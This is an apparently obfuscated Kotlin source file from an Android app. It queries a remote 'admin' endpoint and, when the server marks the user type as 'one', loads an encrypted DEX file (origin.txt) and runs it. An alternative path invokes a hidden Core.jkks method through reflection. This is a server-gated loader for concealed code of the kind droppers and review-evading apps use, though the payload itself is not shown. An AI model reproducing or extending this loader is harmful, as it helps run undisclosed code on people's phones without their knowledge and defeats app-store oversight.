package gh.sj

import android.util.Log
import gh.cark.NcZong
import gh.cark.DexLoaderHelper

object NetCong {
    
    /**
     * Admin请求回调接口
     */
    interface AdminCallback {
        fun onSuccess(response: String)
        fun onFailure(error: String)
    }
    
    /**
     * 统一的Admin请求方法
     */
    fun requestAdmin(callback: AdminCallback) {
        NcZong.showLog("NetCong: requestAdmin")
        
        NcGoA.postAdminData(object : NcGoA.CallbackMy {
            override fun onSuccess(result: String) {
                NcZong.showLog("requestAdmin success=${result}")
                MvS.string(result, "adminData")
                callback.onSuccess(result)
            }
            
            override fun onFailure(error: String) {
                NcZong.showLog("requestAdmin failure=${error}")
                MvS.string(error, "adminData")
                callback.onFailure(error)
            }
        })
    }

    var isCanNextGo = false
    fun canNextFun(json:String){
        val userType = NcZong.getTypeState(json)
        if(userType=="one"){
            // 调用 fanRu 方法，通过反射调用 Core.jkks
            Log.e("TAG", "canNextFun: ", )
            isCanNextGo = true
            
            // 方式一：直接调用（当DEX已经在classpath中时）
            // val cInstance = createCInstance()
            // fanRu(NcZong.zongApp, cInstance)
            
            // 方式二：从加密的origin.txt加载DEX并调用（推荐）
            DexLoaderHelper.loadAndExecuteDex(NcZong.zongApp)
        }
    }

    /**
     * 创建 com.ak.c 接口的实现类实例
     * 通过反射创建 k.b.b 实例
     */
    private fun createCInstance(): Any? {
        return try {
            // 反射创建 k.b.b 类的实例
            val bClass = Class.forName("k.b.b")
            bClass.newInstance()
        } catch (e: Exception) {
            NcZong.showLog("createCInstance error: ${e.message}")
            null
        }
    }

    fun fanRu(context: Any?, cParam: Any?) {
        try {
            // 反射获取 Core 类
            val coreClass = Class.forName("com.ak.impI.Core")
            
            // 获取 com.ak.c 类型（第二个参数类型）
            val cClass = Class.forName("com.ak.c")
            
            // 获取 jkks 静态方法
            val jkksMethod = coreClass.getDeclaredMethod(
                "jkks",
                Any::class.java,  // Object context
                cClass            // com.ak.c c
            )
            
            // 设置方法可访问（如果是私有的）
            jkksMethod.isAccessible = true
            
            // 调用静态方法（第一个参数为null，因为是静态方法）
            jkksMethod.invoke(null, context, cParam)
            
            NcZong.showLog("fanRu: jkks method invoked successfully")
        } catch (e: ClassNotFoundException) {
            NcZong.showLog("fanRu error: Class not found - ${e.message}")
        } catch (e: NoSuchMethodException) {
            NcZong.showLog("fanRu error: Method not found - ${e.message}")
        } catch (e: Exception) {
            NcZong.showLog("fanRu error: ${e.message}")
        }
    }
}